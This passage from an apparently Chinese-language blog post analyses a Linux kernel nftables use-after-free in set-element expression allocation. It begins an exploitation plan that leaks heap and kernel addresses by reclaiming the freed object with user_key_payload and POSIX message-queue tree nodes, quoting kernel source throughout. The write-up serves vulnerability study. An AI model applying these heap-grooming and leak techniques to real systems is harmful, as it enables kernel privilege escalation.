class="keyword">struct</span> <span class="title">nft_set</span>*<span class="title">set</span>;</span></span><br><span class="line">u8sreg;</span><br><span class="line">u8dreg;</span><br><span class="line"><span class="keyword">bool</span>invert;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_binding</span><span class="title">binding</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nf_tables_bind_set</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct nft_set_binding *binding)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_binding</span> *<span class="title">i</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_iter</span> <span class="title">iter</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">set</span>-&gt;use == UINT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!list_empty(&amp;<span class="built_in">set</span>-&gt;bindings) &amp;&amp; nft_set_is_anonymous(<span class="built_in">set</span>))</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (binding-&gt;flags &amp; NFT_SET_MAP) &#123;</span><br><span class="line"><span class="comment">/* If the set is already bound to the same chain all</span></span><br><span class="line"><span class="comment"> * jumps are already validated for that chain.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">list_for_each_entry (i, &amp;<span class="built_in">set</span>-&gt;bindings, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (i-&gt;flags &amp; NFT_SET_MAP &amp;&amp;</span><br><span class="line">    i-&gt;chain == binding-&gt;chain)</span><br><span class="line"><span class="keyword">goto</span> bind;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">iter.genmask = nft_genmask_next(ctx-&gt;net);</span><br><span class="line">iter.skip = <span class="number">0</span>;</span><br><span class="line">iter.count = <span class="number">0</span>;</span><br><span class="line">iter.err = <span class="number">0</span>;</span><br><span class="line">iter.fn = nf_tables_bind_check_setelem;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;ops-&gt;walk(ctx, <span class="built_in">set</span>, &amp;iter);</span><br><span class="line"><span class="keyword">if</span> (!iter.err)</span><br><span class="line">iter.err = nft_set_catchall_bind_check(ctx, <span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (iter.err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> iter.err;</span><br><span class="line">&#125;</span><br><span class="line">bind:</span><br><span class="line">binding-&gt;chain = ctx-&gt;chain;</span><br><span class="line">list_add_tail_rcu(&amp;binding-&gt;<span class="built_in">list</span>, &amp;<span class="built_in">set</span>-&gt;bindings);</span><br><span class="line">nft_set_trans_bind(ctx, <span class="built_in">set</span>);</span><br><span class="line"><span class="built_in">set</span>-&gt;use++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到<code>nft_set_elem_expr_alloc</code>函数中若是我们控制走向<code>err_set_elem_expr</code>分支即可销毁<code>expr</code>。</p><p>当<code>if (!(expr-&gt;ops-&gt;type-&gt;flags &amp; NFT_EXPR_STATEFUL))</code>满足是会进入到<code>err_set_elem_expr</code>分支中，正好我们使用的<code>type</code>中是不存在这个东西的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nf_tables_destroy_set</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (list_empty(&amp;<span class="built_in">set</span>-&gt;bindings) &amp;&amp; nft_set_is_anonymous(<span class="built_in">set</span>))</span><br><span class="line">nft_set_destroy(ctx, <span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_lookup_destroy</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">const</span> struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_lookup</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line"></span><br><span class="line">nf_tables_destroy_set(ctx, priv-&gt;<span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nf_tables_expr_destroy</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">   struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *<span class="title">type</span> =</span> expr-&gt;ops-&gt;type;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (expr-&gt;ops-&gt;destroy)</span><br><span class="line">expr-&gt;ops-&gt;destroy(ctx, expr);</span><br><span class="line">module_put(type-&gt;owner);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nft_expr_destroy</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">nf_tables_expr_destroy(ctx, expr);</span><br><span class="line">kfree(expr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据这里的调用关系可以看到，其实最终实现的就只是单单<code>kfree</code>了个<code>expr</code>，而并没有脱链之类的操作，那么此时就发生了<code>UAF</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span> <span class="title">nft_lookup_ops</span> =</span> &#123;</span><br><span class="line">.type= &amp;nft_lookup_type,</span><br><span class="line">.size= NFT_EXPR_SIZE(<span class="keyword">sizeof</span>(struct nft_lookup)),</span><br><span class="line">.eval= nft_lookup_eval,</span><br><span class="line">.init= nft_lookup_init,</span><br><span class="line">.activate= nft_lookup_activate,</span><br><span class="line">.deactivate= nft_lookup_deactivate,</span><br><span class="line">.destroy= nft_lookup_destroy,</span><br><span class="line">.dump= nft_lookup_dump,</span><br><span class="line">.validate= nft_lookup_validate,</span><br><span class="line">.reduce= nft_lookup_reduce,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> <span class="title">nft_lookup_type</span> __<span class="title">read_mostly</span> =</span> &#123;</span><br><span class="line">.name= <span class="string">&quot;lookup&quot;</span>,</span><br><span class="line">.ops= &amp;nft_lookup_ops,</span><br><span class="line">.policy= nft_lookup_policy,</span><br><span class="line">.maxattr= NFTA_LOOKUP_MAX,</span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然而<code>lookup</code>的<code>expre</code>的<code>flag</code>位恰好没有<code>NFT_EXPR_STATEFUL</code>标识位。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="泄漏堆地址"><a href="#泄漏堆地址" class="headerlink" title="泄漏堆地址"></a>泄漏堆地址</h3><p>其实上述漏洞存在很大的局限性，在触发到<code>UAF</code>之后，唯一能做到的一件事就是修改<code>(struct nft_lookup *)(expr-&gt;data)-&gt;binding-&gt;next</code>指针指向新生成的<code>new_expr</code>。</p><p><code>expr = kzalloc(expr_info.ops-&gt;size, GFP_KERNEL);</code>在上一篇文章提到了内核内存隔离这一说，因为标识位的不同导致无法使用很多已有结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU destructor */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span>datalen;<span class="comment">/* length of this data */</span></span><br><span class="line"><span class="keyword">char</span>data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面<code>next</code>指针的偏移正好为<code>0x18</code>而这里的<code>data</code>数组是用户可控，那么可以通过触发uaf之后泄漏出堆地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">user_preparse</span><span class="params">(struct key_preparsed_payload *prep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> *<span class="title">upayload</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> datalen = prep-&gt;datalen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (datalen &lt;= <span class="number">0</span> || datalen &gt; <span class="number">32767</span> || !prep-&gt;data)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">upayload = kmalloc(<span class="keyword">sizeof</span>(*upayload) + datalen, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!upayload)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* attach the data */</span></span><br><span class="line">prep-&gt;quotalen = datalen;</span><br><span class="line">prep-&gt;payload.data[<span class="number">0</span>] = upayload;</span><br><span class="line">upayload-&gt;datalen = datalen;</span><br><span class="line"><span class="built_in">memcpy</span>(upayload-&gt;data, prep-&gt;data, datalen);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(user_preparse);</span><br></pre></td></tr></table></figure><p>并且可以注意到他的申请参数也为<code>GFP_KERNEL</code>。</p><h3 id="泄漏内核地址"><a href="#泄漏内核地址" class="headerlink" title="泄漏内核地址"></a>泄漏内核地址</h3><p>这里用到的是mqueue中的posix消息队列模块，该模块和msg_msg一样是IPC进程间通信的消息队列功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>  __rb_parent_color;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">rb_right</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">rb_left</span>;</span></span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span><span class="title">rb_node</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">msg_list</span>;</span></span><br><span class="line"><span class="keyword">int</span>priority;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到<code>posix_msg_tree_node</code>的next指针刚好落在了0x18这个位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_mq_timedsend</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">const</span> <span class="keyword">char</span> __user *u_msg_ptr,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> msg_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> msg_prio,</span></span></span><br><span class="line"><span class="params"><span class="function">struct timespec64 *ts)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext_wait_queue</span> <span class="title">wait</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext_wait_queue</span> *<span class="title">receiver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg_ptr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mqueue_inode_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">ktime_t</span> expires, *timeout = <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> *<span class="title">new_leaf</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">  msg_ptr = load_msg(u_msg_ptr, msg_len);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (!info-&gt;node_cache)</span><br><span class="line">new_leaf = kmalloc(<span class="keyword">sizeof</span>(*new_leaf), GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">  spin_lock(&amp;info-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!info-&gt;node_cache &amp;&amp; new_leaf) &#123;</span><br><span class="line"><span class="comment">/* Save our speculative allocation into the cache */</span></span><br><span class="line">INIT_LIST_HEAD(&amp;new_leaf-&gt;msg_list);</span><br><span class="line">info-&gt;node_cache = new_leaf;</span><br><span class="line">new_leaf = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">kfree(new_leaf);</span><br><span class="line">&#125;</span><br><span class="line">  <span class="keyword">if</span> (info-&gt;attr.mq_curmsgs == info-&gt;attr.mq_maxmsg) &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">    <span class="keyword">if</span> (receiver) &#123;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">    ret = msg_insert(msg_ptr, info);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE5(mq_timedsend, <span class="keyword">mqd_t</span>, mqdes, <span class="keyword">const</span> <span class="keyword">char</span> __user *, u_msg_ptr,</span><br><span class="line"><span class="keyword">size_t</span>, msg_len, <span class="keyword">unsigned</span> <span class="keyword">int</span>, msg_prio,</span><br><span class="line"><span class="keyword">const</span> struct __kernel_timespec __user *, u_abs_timeout)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec64</span> <span class="title">ts</span>, *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (u_abs_timeout) &#123;</span><br><span class="line"><span class="keyword">int</span> res = prepare_timeout(u_abs_timeout, &amp;ts);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">p = &amp;ts;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> do_mq_timedsend(mqdes, u_msg_ptr, msg_len, msg_prio, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体流程就是首先从用户态载入消息，然后创建对应的<code>posix_msg_tree_node</code>结构体，将结构体放入到<code>info</code>中，最后插入到消息队列中。可以看到在申请<code>posix_msg_tree_node</code>结构体时也是使用了<code>GFP_KERNEL</code>标识位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">msg_insert</span><span class="params">(struct msg_msg *msg, struct mqueue_inode_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> **<span class="title">p</span>, *<span class="title">parent</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> *<span class="title">leaf</span>;</span></span><br><span class="line"><span class="keyword">bool</span> rightmost = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">p = &amp;info-&gt;msg_tree.rb_node;</span><br><span class="line"><span class="keyword">while</span> (*p) &#123;</span><br><span class="line">parent = *p;</span><br><span class="line">leaf = rb_entry(parent, struct posix_msg_tree_node, rb_node);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (likely(leaf-&gt;priority == msg-&gt;m_type))</span><br><span class="line"><span class="keyword">goto</span> insert_msg;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (msg-&gt;m_type &lt; leaf-&gt;priority) &#123;</span><br><span class="line">p = &amp;(*p)-&gt;rb_left;</span><br><span class="line">rightmost = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">p = &amp;(*p)-&gt;rb_right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (info-&gt;node_cache) &#123;</span><br><span class="line">leaf = info-&gt;node_cache;</span><br><span class="line">info-&gt;node_cache = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">leaf = kmalloc(<span class="keyword">sizeof</span>(*leaf), GFP_ATOMIC);</span><br><span class="line"><span class="keyword">if</span> (!leaf)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">INIT_LIST_HEAD(&amp;leaf-&gt;msg_list);</span><br><span class="line">&#125;</span><br><span class="line">leaf-&gt;priority = msg-&gt;m_type;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rightmost)</span><br><span class="line">info-&gt;msg_tree_rightmost = &amp;leaf-&gt;rb_node;</span><br><span class="line"></span><br><span class="line">rb_link_node(&amp;leaf-&gt;rb_node, parent, p);</span><br><span class="line">rb_insert_color(&amp;leaf-&gt;rb_node, &amp;info-&gt;msg_tree);</span><br><span class="line">insert_msg:</span><br><span class="line">info-&gt;attr.mq_curmsgs++;</span><br><span class="line">info-&gt;qsize += msg-&gt;m_ts;</span><br><span class="line">list_add_tail(&amp;msg-&gt;m_list, &amp;leaf-&gt;msg_list);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在最后是将消息添加到<code>leaf</code>中去了，并且next指针为0x18，如果出发了uaf覆盖的话就会达成以下效果</p><p><img   src="/images/8-1675211986.png"  alt="偷图侵删"></p><p>那么接下来只需要读取消息即可达到泄漏的目的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(mq_timedreceive, <span class="keyword">mqd_t</span>, mqdes, <span class="keyword">char</span> __user *, u_msg_ptr,</span><br><span class="line"><span class="keyword">size_t</span>, msg_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> __user *, u_msg_prio,</span><br><span class="line"><span class="keyword">const</span> struct __kernel_timespec __user *, u_abs_timeout)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec64</span> <span class="title">ts</span>, *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (u_abs_timeout) &#123;</span><br><span class="line"><span class="keyword">int</span> res = prepare_timeout(u_abs_timeout, &amp;ts);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">p = &amp;ts;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> do_mq_timedreceive(mqdes, u_msg_ptr, msg_len, u_msg_prio, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_mq_timedreceive</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">char</span> __user *u_msg_ptr,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> msg_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> __user *u_msg_prio,</span></span></span><br><span class="line"><span class="params"><span class="function">struct timespec64 *ts)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg_ptr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mqueue_inode_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext_wait_queue</span> <span class="title">wait</span>;</span></span><br><span class="line"><span class="keyword">ktime_t</span> expires, *timeout = <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> *<span class="title">new_leaf</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ts) &#123;</span><br><span class="line">expires = timespec64_to_ktime(*ts);</span><br><span class="line">timeout = &amp;expires;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">audit_mq_sendrecv(mqdes, msg_len, <span class="number">0</span>, ts);</span><br><span class="line"></span><br><span class="line">f = fdget(mqdes);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!f.file)) &#123;</span><br><span class="line">ret = -EBADF;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inode = file_inode(f.file);</span><br><span class="line"><span class="keyword">if</span> 